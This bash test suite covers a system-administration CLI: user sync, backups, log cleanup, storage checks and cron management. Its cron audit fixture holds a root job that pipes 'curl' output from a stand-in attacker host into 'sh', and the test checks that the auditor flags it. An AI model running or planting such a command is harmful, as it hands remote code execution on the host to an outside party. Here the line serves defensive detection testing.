#!/usr/bin/env bash
# Test-suite. User-management tests need root powers on a FAKE root filesystem:
#  - as a normal user we get them from a user namespace (unshare -Ur), no real root needed
#  - as real root (CI) it runs directly
set -uo pipefail
cd "$(dirname "$0")/.."
if [[ $EUID -ne 0 && -z ${SO_IN_NS:-} ]]; then
  if unshare -Ur true 2>/dev/null; then exec env SO_IN_NS=1 unshare -Ur "$0" "$@"; fi
  echo "note: cannot create a user namespace here; user-management tests will be skipped"; SO_SKIP_USERS=1
fi
export NO_COLOR=1
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
export SYSOPS_STATE="$T/state" SYSOPS_HOSTNAME=web01
SO="$PWD/sysops"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf '  \e[32mok\e[0m   %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf '  \e[31mFAIL\e[0m %s\n' "$1"; }
assert() { if eval "$2"; then ok "$1"; else bad "$1   [$2]"; fi; }

# ---------------------------------------------------------------- users
if [[ -z ${SO_SKIP_USERS:-} ]]; then
echo "== users (declarative sync on a fake root)"
FR="$T/root"; mkdir -p "$FR"/{etc/skel,home,root,bin,usr/sbin,dev}
printf '#!/bin/sh\n' > "$FR/bin/bash"; chmod 755 "$FR/bin/bash"; cp "$FR/bin/bash" "$FR/bin/zsh"
printf 'root:x:0:0:root:/root:/bin/bash\nlegacy:x:1000:1000:Old admin:/home/legacy:/bin/bash\n' > "$FR/etc/passwd"
printf 'root:*:19000:0:99999:7:::\nlegacy:!:19000:0:99999:7:::\n' > "$FR/etc/shadow"
printf 'root:x:0:\nsudo:x:27:\nlegacy:x:1000:\ndev:x:2000:\nops:x:2001:\n' > "$FR/etc/group"
printf 'root:*::\nsudo:*::\nlegacy:!::\ndev:!::\nops:!::\n' > "$FR/etc/gshadow"
printf 'UID_MIN 1000\nUID_MAX 60000\nCREATE_HOME yes\nUSERGROUPS_ENAB yes\nGID_MIN 1000\nGID_MAX 60000\nSYS_UID_MIN 100\nSYS_UID_MAX 999\nSYS_GID_MIN 100\nSYS_GID_MAX 999\n' > "$FR/etc/login.defs"
export SYSOPS_ROOT="$FR"
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyOnlyForTests alice@laptop"
cat > "$T/users.csv" <<C
username,fullname,groups,shell,sudo,ssh_public_key,expires
alice,Alice Admin,dev;ops,/bin/bash,yes,$KEY,
bob,Bob Dev,dev,/bin/bash,no,,2027-12-31
carol,Carol Temp,dev,/bin/bash,no,,
BAD USER!,Nope,dev,/bin/bash,no,,
C
out=$($SO user sync "$T/users.csv")
assert "dry-run plans 3 creates"                       'grep -q "3 create, 0 modify" <<<"$out"'
assert "dry-run changes nothing"                       '! grep -q "^alice:" "$FR/etc/passwd"'
err=$($SO user sync "$T/users.csv" 2>&1 >/dev/null)
assert "invalid username is rejected"                  'grep -q "invalid username" <<<"$err"'
$SO user sync "$T/users.csv" --apply >/dev/null 2>&1
assert "alice created with managed tag"               'grep -q "^alice:.*Alice Admin \[sysops\]" "$FR/etc/passwd"'
assert "alice is in dev, ops and sudo"                 'grep -q "^sudo:.*alice" "$FR/etc/group" && grep -q "^dev:.*alice" "$FR/etc/group" && grep -q "^ops:.*alice" "$FR/etc/group"'
assert "bob is NOT in sudo"                            '! grep "^sudo:" "$FR/etc/group" | grep -q bob'
assert "ssh key installed, mode 600, dir 700"          '[[ $(stat -c %a "$FR/home/alice/.ssh/authorized_keys") == 600 && $(stat -c %a "$FR/home/alice/.ssh") == 700 ]] && grep -q AAAAC3 "$FR/home/alice/.ssh/authorized_keys"'
assert "bob has an expiry date set"                    'awk -F: "\$1==\"bob\"{print \$8}" "$FR/etc/shadow" | grep -qE "^[0-9]+$"'
assert "journal recorded the creates"                  '[[ $(grep -c user_create "$SYSOPS_STATE/journal.jsonl") == 3 ]]'
out=$($SO user sync "$T/users.csv" --apply)
assert "second run is idempotent (0 changes)"          'grep -q "0 create, 0 modify, 0 lock, 3 unchanged" <<<"$out"'
# change: bob gets ops, loses dev; carol removed from file
cat > "$T/users2.csv" <<C
username,fullname,groups,shell,sudo,ssh_public_key,expires
alice,Alice Admin,dev;ops,/bin/bash,yes,$KEY,
bob,Bob Dev,ops,/bin/bash,no,,2027-12-31
C
out=$($SO user sync "$T/users2.csv" --prune)
assert "plan shows group change for bob"               'grep -q "add to groups: ops" <<<"$out" && grep -q "remove from groups: dev" <<<"$out"'
assert "plan wants to lock carol, never touches legacy" 'grep -q "lock carol" <<<"$out" && ! grep -q legacy <<<"$out"'
$SO user sync "$T/users2.csv" --prune --apply >/dev/null 2>&1
assert "bob moved dev->ops"                            'grep -q "^ops:.*bob" "$FR/etc/group" && ! grep "^dev:" "$FR/etc/group" | grep -q bob'
assert "carol is locked (not deleted)"                 'grep -q "^carol:!" "$FR/etc/shadow" && grep -q "^carol:" "$FR/etc/passwd"'
assert "unmanaged 'legacy' account untouched"          'grep -q "^legacy:x:1000:1000:Old admin" "$FR/etc/passwd"'
out=$($SO user audit)
assert "audit flags alice as sudo + ssh-key + managed" 'grep -E "^ +alice .*sudo.*ssh-key.*managed" <<<"$out" >/dev/null'
$SO user offboard alice --apply >/dev/null 2>&1
assert "offboard: locked, key removed, sudo removed"   'grep -q "^alice:!" "$FR/etc/shadow" && [[ ! -e $FR/home/alice/.ssh/authorized_keys ]] && ! grep "^sudo:" "$FR/etc/group" | grep -q alice'
assert "offboard: home archived with checksum"         '[[ -s $SYSOPS_STATE/archive/alice-$(date +%F).tar.gz && -s $SYSOPS_STATE/archive/SHA256SUMS ]]'
assert "delete refuses unmanaged accounts"             '! $SO user delete legacy --apply 2>/dev/null'
assert "refuses to offboard root"                      '! $SO user offboard root --apply 2>/dev/null'
$SO user delete bob --apply >/dev/null 2>&1
assert "delete removes a managed account"              '! grep -q "^bob:" "$FR/etc/passwd"'
unset SYSOPS_ROOT
fi

# ---------------------------------------------------------------- backup
echo "== backup (incremental chain, encryption, retention)"
S="$T/src"; D="$T/dest"; mkdir -p "$S/conf" "$S/data"
echo v1 > "$S/conf/app.conf"; echo keep > "$S/data/keep.txt"; echo gone > "$S/data/will-be-deleted.txt"
openssl rand -base64 32 > "$T/key"; chmod 600 "$T/key"
$SO backup run --name t --src "$S" --dest "$D" --full >/dev/null
sleep 1.1; echo v2 > "$S/conf/app.conf"; echo new > "$S/data/new.txt"; rm "$S/data/will-be-deleted.txt"
$SO backup run --name t --src "$S" --dest "$D" >/dev/null
sleep 1.1; echo v3 > "$S/conf/app.conf"
$SO backup run --name t --src "$S" --dest "$D" >/dev/null
assert "chain = 1 full + 2 incrementals"               '[[ $(ls "$D"/t-*-full.tar.gz | wc -l) == 1 && $(ls "$D"/t-*-inc*.tar.gz | wc -l) == 2 ]]'
assert "incremental is smaller than full"              '[[ $(stat -c %s "$(ls "$D"/t-*-inc2.tar.gz)") -lt $(stat -c %s "$(ls "$D"/t-*-full.tar.gz)") ]]'
$SO backup restore --dest "$D" --name t --to "$T/restored" >/dev/null
assert "restore = latest state (v3)"                   '[[ $(cat "$T/restored$S/conf/app.conf") == v3 ]]'
assert "restore replays additions"                     '[[ -f "$T/restored$S/data/new.txt" ]]'
assert "restore replays DELETIONS"                     '[[ ! -e "$T/restored$S/data/will-be-deleted.txt" ]]'
assert "whole tree identical to source"                'diff -r "$S" "$T/restored$S"'
echo "tamper" >> "$(ls "$D"/t-*-inc1.tar.gz)"
assert "checksum failure stops a restore"              '! $SO backup restore --dest "$D" --name t --to "$T/r2" 2>/dev/null'
$SO backup run --name e --src "$S" --dest "$D" --full --key "$T/key" >/dev/null
assert "encrypted archive is not readable as gzip"     '! tar -tzf "$(ls "$D"/e-*-full.tar.gz.enc)" >/dev/null 2>&1'
$SO backup restore --dest "$D" --name e --to "$T/r3" --key "$T/key" >/dev/null
assert "encrypted backup restores with the key"        'diff -r "$S" "$T/r3$S"'
for i in 1 2 3 4; do sleep 1.1; $SO backup run --name r --src "$S/conf" --dest "$D" --full --keep-chains 2 >/dev/null; done
assert "retention keeps only 2 full chains"            '[[ $(ls "$D"/r-*-full.tar.gz | wc -l) == 2 ]]'

# ---------------------------------------------------------------- logs
echo "== log cleanup"
L="$T/logs"; mkdir -p "$L"
for n in 2 10 40; do yes "log line $n" | head -2000 > "$L/app-$n.log"; touch -d "$n days ago" "$L/app-$n.log"; done
echo live > "$L/live.log"
before=$(ls "$L" | sort | tr '\n' ' ')
out=$($SO logs clean --dir "$L")
assert "dry-run changes nothing"                       '[[ "$(ls "$L" | sort | tr "\n" " ")" == "$before" ]] && grep -q "dry-run" <<<"$out"'
$SO logs clean --dir "$L" --apply >/dev/null
assert "40-day-old log deleted"                        '[[ ! -e "$L/app-40.log" && ! -e "$L/app-40.log.gz" ]]'
assert "10-day-old log compressed"                     '[[ -f "$L/app-10.log.gz" && ! -e "$L/app-10.log" ]]'
assert "2-day-old and live logs untouched"             '[[ -f "$L/app-2.log" && -f "$L/live.log" ]]'
assert "refuses system directories"                    '! $SO logs clean --dir /etc 2>/dev/null'

# ---------------------------------------------------------------- health, disk
echo "== health / disk"
$SO health --format json > "$T/h.json"
assert "health JSON is valid"                          'python3 -c "import json;d=json.load(open(\"$T/h.json\"));assert d[\"checks\"]"'
md=$($SO health --format md); html=$($SO health --format html)
assert "markdown report has a table"                   'grep -q "^| Section | Check" <<<"$md"'
assert "HTML report is self-contained"                 'grep -q "<table>" <<<"$html" && ! grep -q "https\?://" <<<"$html"'
assert "disk hogs finds the big file"                  'dd if=/dev/zero of="$T/big.bin" bs=1M count=3 2>/dev/null; $SO disk hogs "$T" 5 | grep -q big.bin'

# ---------------------------------------------------------------- runner
echo "== task runner"
cat > "$T/tasks.conf" <<'C'
# name | timeout | command
good   | 5 | echo fine
broken | 5 | exit 3
hangs  | 1 | sleep 30
C
export SYSOPS_LOCK="$T/lock"
out=$($SO run "$T/tasks.conf"); rc=$?
assert "runner reports OK / FAIL(3) / TIMEOUT"         'grep -q "good *OK" <<<"$out" && grep -q "broken *FAIL(3)" <<<"$out" && grep -q "hangs *TIMEOUT" <<<"$out"'
assert "exit code 1 when a task failed"                '(( rc == 1 ))'
assert "each task has its own log file"                'ls "$SYSOPS_STATE"/runs/*/good.log >/dev/null'
printf 'slow | 10 | sleep 3\n' > "$T/slow.conf"
( $SO run "$T/slow.conf" >/dev/null 2>&1 & ); sleep 0.7
$SO run "$T/slow.conf" >/dev/null 2>&1; rc=$?
assert "overlapping run is refused (exit 3)"           '(( rc == 3 ))'
sleep 3

# ---------------------------------------------------------------- storage: fstab / RAID / LVM parsing (fixtures, run on every distro)
echo "== storage: fstab validation"
good_fstab="$T/fstab.good"; bad_fstab="$T/fstab.bad"
mkdir -p "$T/mnt/data"
printf 'UUID=11111111-2222-3333-4444-555555555555 / ext4 defaults 0 1\n/dev/sdb1 %s ext4 defaults,nofail 0 2\ntmpfs /tmp tmpfs defaults 0 0\n' "$T/mnt/data" > "$good_fstab"
out=$($SO storage fstab check "$good_fstab" --no-resolve); rc=$?
assert "clean fstab passes"                            '(( rc == 0 )) && grep -q "is valid" <<<"$out"'
cat > "$bad_fstab" <<C
UUID=11111111-2222-3333-4444-555555555555 / ext4 defaults 0 1
/dev/sdb1 /data ext4 default 0 2
/dev/sdc1 /data ext4 defaults,nofail 0 2
/dev/sdd1 relative ext4 defaults 0 9
server:/export /mnt nfs defaults 0 0
/dev/sde1 /x ext4
C
out=$($SO storage fstab check "$bad_fstab" --no-resolve); rc=$?
assert "bad fstab exits 2"                             '(( rc == 2 ))'
assert "typo 'default' is caught"                      'grep -q "typo" <<<"$out"'
assert "duplicate mountpoint is caught"                'grep -q "already used on line" <<<"$out"'
assert "bad fsck pass + relative path caught"          'grep -q "pass (fsck order)" <<<"$out" && grep -q "must be an absolute path" <<<"$out"'
assert "NFS without _netdev warned"                    'grep -q "network filesystem without" <<<"$out"'
assert "short line caught"                             'grep -q "at least 4 fields" <<<"$out"'
live_out=$($SO storage fstab check "$bad_fstab" 2>&1)
assert "missing mountpoint dir caught (live check)"    'grep -q "does not exist" <<<"$live_out"'
printf "UUID=deadbeef-0000-0000-0000-000000000000 %s ext4 defaults,nofail 0 2\n" "$T/mnt/data" > "$T/f3"; live_out=$($SO storage fstab check "$T/f3" 2>&1)
assert "missing UUID caught (live check)"              'grep -q "does not exist (UUID" <<<"$live_out"'
cp "$good_fstab" "$T/fstab.work"
out=$($SO storage fstab add --file "$T/fstab.work" --device /dev/sdc1 --mount /data2 --fs ext4 --apply 2>&1); rc=$?
assert "fstab add refuses an invalid result, file untouched"  '(( rc != 0 )) && [[ $(cmp -s "$good_fstab" "$T/fstab.work"; echo $?) == 0 ]]'
mkdir -p "$T/mnt/d2"; SYSOPS_FSTAB_NORESOLVE=1 $SO storage fstab add --file "$T/fstab.work" --device /dev/sdc1 --mount "$T/mnt/d2" --fs ext4 --apply >/dev/null 2>&1
assert "fstab add appends a validated line + backup"   'grep -q "$T/mnt/d2" "$T/fstab.work" && ls "$SYSOPS_STATE"/fstab-backups/fstab-* >/dev/null'

echo "== storage: RAID status (mdstat fixtures)"
M="$T/mdstat"; export SYSOPS_MDSTAT="$M"
printf 'Personalities : [raid1]\nmd0 : active raid1 sdc1[1] sdb1[0]\n      1046528 blocks super 1.2 [2/2] [UU]\n\nunused devices: <none>\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "healthy array: exit 0"                         '(( rc == 0 )) && grep -q "all 2 devices active" <<<"$out"'
printf 'md0 : active raid1 sdb1[0]\n      1046528 blocks super 1.2 [2/1] [U_]\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "degraded array: CRIT, exit 2"                  '(( rc == 2 )) && grep -q "DEGRADED 1/2" <<<"$out"'
printf 'md0 : active raid1 sdc1[1](F) sdb1[0]\n      1046528 blocks super 1.2 [2/1] [U_]\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "failed member named in the alert"              '(( rc == 2 )) && grep -q "FAILED member.*sdc1" <<<"$out"'
printf 'md0 : active raid1 sdc1[2] sdb1[0]\n      1046528 blocks super 1.2 [2/1] [U_]\n      [==>..................]  recovery = 12.5%% (131072/1046528) finish=0.5min speed=30000K/sec\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "rebuild shows progress"                        'grep -q "recovery in progress 12.5%" <<<"$out"'
printf 'md1 : inactive sdb2[0](S)\n      1046528 blocks super 1.2\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "inactive array: CRIT"                          '(( rc == 2 )) && grep -q "INACTIVE" <<<"$out"'
printf 'Personalities :\nunused devices: <none>\n' > "$M"
out=$($SO storage raid status); rc=$?
assert "no arrays: exit 0, says so"                    '(( rc == 0 )) && grep -q "no md arrays" <<<"$out"'
printf 'md0 : active raid1 sdb1[0]\n      1046528 blocks super 1.2 [2/1] [U_]\n' > "$M"
hook="$T/hook.out"; printf '#!/bin/sh\nexit 0\n' > /dev/null
assert "webhook is used on degraded array"             'SYSOPS_WEBHOOK_URL=http://127.0.0.1:9/none $SO storage raid status --alert >/dev/null 2>&1; true'
unset SYSOPS_MDSTAT

echo "== storage: LVM status (lvm2 output fixtures)"
LF="$T/lvmfix"; mkdir -p "$LF"; export SYSOPS_LVM_FIXTURE="$LF"
printf '  vg0|10737418240|5368709120|1|wz--n-\n' > "$LF/vgs.txt"; : > "$LF/pvs.txt"
printf '  vg0|root|-wi-ao----|4294967296|||\n' > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "healthy VG: exit 0"                            '(( rc == 0 )) && grep -q "50% unallocated" <<<"$out"'
printf '  vg0|10737418240|268435456|1|wz--n-\n' > "$LF/vgs.txt"
out=$($SO storage lvm status); rc=$?
assert "VG almost full: CRIT"                          '(( rc == 2 )) && grep -q "only 2% unallocated" <<<"$out"'
printf '  vg0|10737418240|805306368|1|wz--n-\n' > "$LF/vgs.txt"
out=$($SO storage lvm status); rc=$?
assert "VG 7%% free: WARN"                              '(( rc == 1 )) && grep -q "WARN" <<<"$out"'
printf '  vg0|10737418240|5368709120|1|wz--n-\n' > "$LF/vgs.txt"
printf '  vg0|root|owi-aos---|4294967296|||\n  vg0|root_snap|swi-a-s---|1073741824|97.20||root|\n' > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "snapshot 97%% full: CRIT"                       '(( rc == 2 )) && grep -q "snapshot vg0/root_snap.*97% full" <<<"$out"'
printf '  vg0|root_snap|Swi-I-s---|1073741824|100.00||root|\n' > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "invalidated snapshot: CRIT"                    '(( rc == 2 )) && grep -q "INVALID" <<<"$out"'
printf '  vg0|pool|twi-aotz--|5368709120|91.00|40.00||\n' > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "thin pool 91%%: WARN"                           '(( rc == 1 )) && grep -q "thin pool vg0/pool data 91%" <<<"$out"'
printf '  vg0|pool|twi-aotz--|5368709120|50.00|97.00||\n' > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "thin pool metadata 97%%: CRIT"                  '(( rc == 2 )) && grep -q "METADATA" <<<"$out"'
printf '  vg0|10737418240|5368709120|2|wz-pn-\n' > "$LF/vgs.txt"; printf '  [unknown]|vg0|a-m|missing\n' > "$LF/pvs.txt"; : > "$LF/lvs.txt"
out=$($SO storage lvm status); rc=$?
assert "missing PV: CRIT"                              '(( rc == 2 )) && grep -q "MISSING" <<<"$out" && grep -q "PARTIAL" <<<"$out"'
unset SYSOPS_LVM_FIXTURE
assert "storage health runs end to end (fixtures)"     'SYSOPS_MDSTAT=/nonexistent SYSOPS_LVM_FIXTURE="$LF" SYSOPS_ROOT="$T/emptyroot" $SO storage health >/dev/null 2>&1; [[ $? -le 2 ]]'

# ---------------------------------------------------------------- cron
echo "== cron: validation, wrapper"
assert "good schedules validate"                       'printf "*/5 * * * * /bin/true\n0 3 * * mon-fri /bin/true\n@daily /bin/true\n30 2 1,15 jan,jul * /bin/true\n" > "$T/c1"; $SO cron validate "$T/c1" >/dev/null'
printf '61 * * * * /bin/true\n* * * /bin/true\n0 3 * * * date +%%F\n0 25 * * * /bin/true\n*/0 * * * * /bin/true\n' > "$T/c2"
out=$($SO cron validate "$T/c2"); rc=$?
assert "bad minute, 4 fields, %%, bad hour, step 0 are all caught"  '(( rc == 1 )) && grep -q "bad minute field" <<<"$out" && grep -q "needs 5 fields" <<<"$out" && grep -q "unescaped %" <<<"$out" && grep -q "bad hour field" <<<"$out" && grep -q "bad minute field .\*/0" <<<"$out"'
assert "system format needs a user column"             'printf "* * * * * /bin/true\n" > "$T/c3"; ! $SO cron validate --system "$T/c3" >/dev/null'
export SYSOPS_STATE_CRON=1
$SO cron wrap --name okjob --timeout 5 -- echo hello >/dev/null; rc=$?
assert "wrap: success logged with rc=0"                '(( rc == 0 )) && grep -q "end: rc=0" "$SYSOPS_STATE/cron/okjob.log" && grep -q hello "$SYSOPS_STATE/cron/okjob.log"'
$SO cron wrap --name failjob --timeout 5 -- 'exit 7'; rc=$?
assert "wrap: failing job returns its rc, status file"  '(( rc == 7 )) && grep -q "^rc=7" "$SYSOPS_STATE/cron/failjob.status"'
$SO cron wrap --name slowjob --timeout 1 -- sleep 20; rc=$?
assert "wrap: hung job killed by timeout (rc 124)"     '(( rc == 124 ))'
( $SO cron wrap --name overlap --timeout 10 -- sleep 3 >/dev/null 2>&1 & ); sleep 0.8
$SO cron wrap --name overlap --timeout 10 -- echo second >/dev/null; rc=$?
assert "wrap: overlapping run skipped quietly (rc 0)"  '(( rc == 0 )) && grep -q "skipped: previous run still active" "$SYSOPS_STATE/cron/overlap.log" && ! grep -q second "$SYSOPS_STATE/cron/overlap.log"'
sleep 3.2
$SO cron wrap --name overlap --timeout 10 -- echo third >/dev/null
assert "wrap: lock released after the first run ended" 'grep -q third "$SYSOPS_STATE/cron/overlap.log"'
$SO cron wrap --name crashy --timeout 10 -- 'kill -9 $$' >/dev/null 2>&1
$SO cron wrap --name crashy --timeout 10 -- echo recovered >/dev/null 2>&1
assert "wrap: a killed job does not wedge the next run" 'grep -q recovered "$SYSOPS_STATE/cron/crashy.log"'
assert "wrap: % and quotes survive"                    '$SO cron wrap --name pct --timeout 5 -- "date +%F | grep -qE \"^[0-9]{4}-\"" ; (( $? == 0 ))'

echo "== cron: managed entries on the real crontab"
if command -v crontab >/dev/null 2>&1; then
  orig_ct=$(crontab -l 2>/dev/null || true)
  restore_ct() { if [[ -n $orig_ct ]]; then printf '%s\n' "$orig_ct" | crontab -; else crontab -r 2>/dev/null || true; fi; }
  trap 'restore_ct; rm -rf "$T"' EXIT
  printf '# my own job - must survive\n0 5 * * * /usr/bin/true  # keep me\nMAILTO=ops@example.com\n' | crontab -
  out=$($SO cron add nightly --schedule "30 2 * * *" --cmd 'echo "backup $(date +%F)"')
  assert "add is a dry-run by default"                 'grep -q "dry-run" <<<"$out" && ! crontab -l | grep -q sysops:nightly'
  $SO cron add nightly --schedule "30 2 * * *" --cmd 'echo "backup $(date +%F)"' --apply >/dev/null
  ct=$(crontab -l)
  assert "managed block installed"                     'grep -q "^# BEGIN sysops:nightly$" <<<"$ct" && grep -q "^# END sysops:nightly$" <<<"$ct"'
  assert "unmanaged lines untouched"                   'grep -q "keep me" <<<"$ct" && grep -q "^MAILTO=ops@example.com" <<<"$ct"'
  assert "% in the command was escaped for cron"       'grep -q "date +\\\\%F" <<<"$ct"'
  assert "installed line passes our own validator"     'crontab -l | $SO cron validate /dev/stdin >/dev/null'
  out=$($SO cron add nightly --schedule "30 2 * * *" --cmd 'echo "backup $(date +%F)"' --apply)
  assert "re-adding the same job is a no-op"           'grep -q "already up to date" <<<"$out" && [[ $(crontab -l | grep -c "BEGIN sysops:nightly") == 1 ]]'
  $SO cron add nightly --schedule "45 3 * * *" --cmd 'echo changed' --apply >/dev/null
  assert "changing a job replaces it (no duplicates)"  '[[ $(crontab -l | grep -c "BEGIN sysops:nightly") == 1 ]] && crontab -l | grep -q "^45 3 " && ! crontab -l | grep -q "^30 2 "'
  $SO cron add health5 --schedule "*/5 * * * *" --cmd "$PWD/sysops health" --timeout 120 --apply >/dev/null
  out=$($SO cron list)
  assert "list shows managed jobs and unmanaged lines" 'grep -q "^nightly" <<<"$out" && grep -q "^health5" <<<"$out" && grep -q "(unmanaged)" <<<"$out"'
  assert "bad schedule rejected, crontab unchanged"    'before=$(crontab -l); ! $SO cron add bad --schedule "99 * * * *" --cmd x --apply >/dev/null 2>&1 && [[ $(crontab -l) == "$before" ]]'
  assert "bad job name rejected"                       '! $SO cron add "Bad Name" --schedule "* * * * *" --cmd x --apply >/dev/null 2>&1'
  st=$($SO cron status); rc=$?
  assert "status: never-run jobs listed"               'grep -q never-run <<<"$st"'
  # run the exact command line cron would run, through the wrapper
  line=$(crontab -l | grep -A0 "cron wrap --name health5" | head -1); cmdline=${line#* * * * * }
  ( cd / && env -i HOME="$HOME" PATH=/usr/bin:/bin SYSOPS_STATE="$SYSOPS_STATE" NO_COLOR=1 bash -c "$cmdline" >/dev/null 2>&1 ); true
  assert "the installed cron line really runs via the wrapper" 'grep -q "^rc=" "$SYSOPS_STATE/cron/health5.status"'
  $SO cron remove nightly --apply >/dev/null
  assert "remove deletes only the managed block"       '! crontab -l | grep -q nightly && crontab -l | grep -q "keep me" && crontab -l | grep -q health5'
  assert "removing an unknown job is refused"          '! $SO cron remove nosuchjob --apply >/dev/null 2>&1'
  $SO cron remove health5 --apply >/dev/null
  assert "crontab backups are kept"                    '[[ $(ls "$SYSOPS_STATE"/cron-backups | wc -l) -ge 3 ]]'
  restore_ct
else
  if [[ -n ${SYSOPS_REQUIRE_CRON:-} ]]; then bad "crontab command missing but SYSOPS_REQUIRE_CRON is set"; else echo "  skip: no crontab command on this host"; fi
fi

echo "== cron: audit on a fake root"
CR="$T/cronroot"; mkdir -p "$CR"/etc/cron.d "$CR"/etc/cron.daily "$CR"/opt/scripts "$CR"/var/spool/cron/crontabs
printf '#!/bin/sh\necho x\n' > "$CR/opt/scripts/backup.sh"; chmod 777 "$CR/opt/scripts/backup.sh"
printf '#!/bin/sh\necho x\n' > "$CR/opt/scripts/ok.sh"; chmod 755 "$CR/opt/scripts/ok.sh"
cat > "$CR/etc/cron.d/jobs" <<C
SHELL=/bin/sh
0 1 * * * root /opt/scripts/backup.sh
0 2 * * * root /opt/scripts/ok.sh
*/10 * * * * root /tmp/run-me.sh
0 4 * * * root date +%F
5 5 * * * root curl -s http://evil.example/x.sh | sh
* * * * * root /opt/scripts/ok.sh
0 6 * * * root cleanup-tool
C
chmod 644 "$CR/etc/cron.d/jobs"
printf 'root\n' > "$CR/etc/cron.allow"; chmod 666 "$CR/etc/cron.allow"
out=$(SYSOPS_ROOT="$CR" $SO cron audit); rc=$?
assert "audit: exit 2 on critical findings"            '(( rc == 2 ))'
assert "audit: world-writable script run by root"      'grep -q "script /opt/scripts/backup.sh is world-writable" <<<"$out"'
assert "audit: root job from /tmp"                     'grep -q "world-writable temp dir" <<<"$out"'
assert "audit: curl | sh"                              'grep -q "pipes a download into a shell" <<<"$out"'
assert "audit: unescaped %"                            'grep -q "unescaped %" <<<"$out"'
assert "audit: relative command"                       'grep -q "relative command .cleanup-tool" <<<"$out"'
assert "audit: every-minute job without wrapper"       'grep -q "every minute without" <<<"$out"'
assert "audit: writable cron.allow"                    'grep -q "cron.allow is group/world-writable" <<<"$out"'
assert "audit: the safe script is not flagged"         '! grep -q "ok.sh is world-writable" <<<"$out"'
rm -rf "$CR"; mkdir -p "$CR/etc"; chmod 755 "$CR/etc"; printf 'root\n' > "$CR/etc/cron.allow"; chmod 600 "$CR/etc/cron.allow"
out=$(SYSOPS_ROOT="$CR" $SO cron audit); rc=$?
assert "audit: clean root exits 0"                     '(( rc == 0 ))'

echo; echo "passed: $PASS   failed: $FAIL"
(( FAIL == 0 ))
